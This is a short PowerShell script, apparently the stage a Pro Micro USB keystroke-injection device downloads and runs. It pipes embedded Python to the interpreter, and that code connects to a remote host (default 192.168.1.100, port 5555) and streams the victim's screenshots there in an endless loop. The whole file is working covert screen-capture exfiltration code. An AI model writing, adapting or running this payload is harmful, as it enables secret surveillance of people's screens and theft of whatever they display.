# Simple Screen Share Client (PowerShell version)
# This is downloaded and run by the Pro Micro

$pythonCode = @"
import socket
import pickle
import cv2
import numpy as np
import pyautogui

SERVER_IP = "$env:SERVER_IP" if "$env:SERVER_IP" else "192.168.1.100"
SERVER_PORT = 5555

client = socket.socket()
client.connect((SERVER_IP, SERVER_PORT))

while True:
    screenshot = pyautogui.screenshot()
    frame = np.array(screenshot)
    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
    data = pickle.dumps(buffer)
    size = len(data)
    client.sendall(f"{size:<16}".encode())
    client.sendall(data)
"@

$pythonCode | python -
